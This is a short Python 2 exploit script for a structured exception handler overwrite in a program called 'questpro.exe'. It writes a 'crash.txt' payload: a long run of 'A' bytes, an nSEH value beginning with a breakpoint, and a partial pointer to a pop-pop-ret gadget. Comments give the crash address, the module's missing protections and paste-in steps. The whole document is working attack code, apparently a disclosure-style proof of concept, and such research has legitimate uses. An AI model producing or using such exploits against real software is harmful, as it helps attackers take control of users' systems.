#!/usr/bin/python
#1- Open 'questpro.exe'
#2- Go to Add   
#3- Paste payload from generated txt file

import os

blt = '\033[92m[\033[0m+\033[92m]\033[0m '           # green success bullet
err = '\033[91m[\033[0m!\033[91m]\033[0m '           # red   error   bullet

try:
    # SEH triggered by exception 'Access violation when reading [41414141]'
    # EIP: 00403AB8    8B10       mov edx, dword ptr ds:[eax]
    offset   = "\x41" * 4116
    nSEH     = '\xcc\x42\x42\x42'
    # 0x00400000 [questpro.exe] Rebase: False | ASLR: False | SafeSEH: False 
    # 0x0042666b [questpro.exe] : pop ecx # pop ebp # ret  | {PAGE_EXECUTE_READ} 
    SEH      = '\x6b\x66\x42'
    payload  = offset+nSEH+SEH
    File     = 'crash.txt'
    f        = open(File, 'w')                       # open file for write
    f.write(payload)
    f.close()                                        # close the file
    print blt + File + " created successfully "
except:
    print err + File + ' failed to create'
    os.remove(File)                                  # remove the failed file

